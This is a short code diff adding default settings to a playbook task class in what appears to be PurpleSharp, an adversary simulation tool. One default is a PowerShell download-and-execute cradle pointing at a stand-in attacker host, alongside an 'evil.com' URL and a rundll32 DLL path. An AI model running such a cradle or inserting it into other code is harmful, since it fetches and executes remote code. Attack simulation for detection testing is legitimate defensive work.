@@ -147,6 +147,15 @@ namespace PurpleSharp.Lib
         public string taskName { get; set; } = @"PurpleSharp Updater";
         public string taskPath { get; set; } = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
 
+        // Used for rundll32.exe, regsvr32.exe and others
+        public string dllPath { get; set; } = @"C:\Windows\twain_64.dll";
+        public string exportName { get; set; } = @"System";
+
+        // Used for rundll32.exe, regsvr32.exe and others
+        public string url { get; set; } = @"http://evil.com/image.png";
+
+        // Used for PowerShell
+        public string commandlet { get; set; } = @"iex(New-Object Net.WebClient).DownloadString('http://attacker.home/myscript.ps1')";
 
 
         public PlaybookTask()
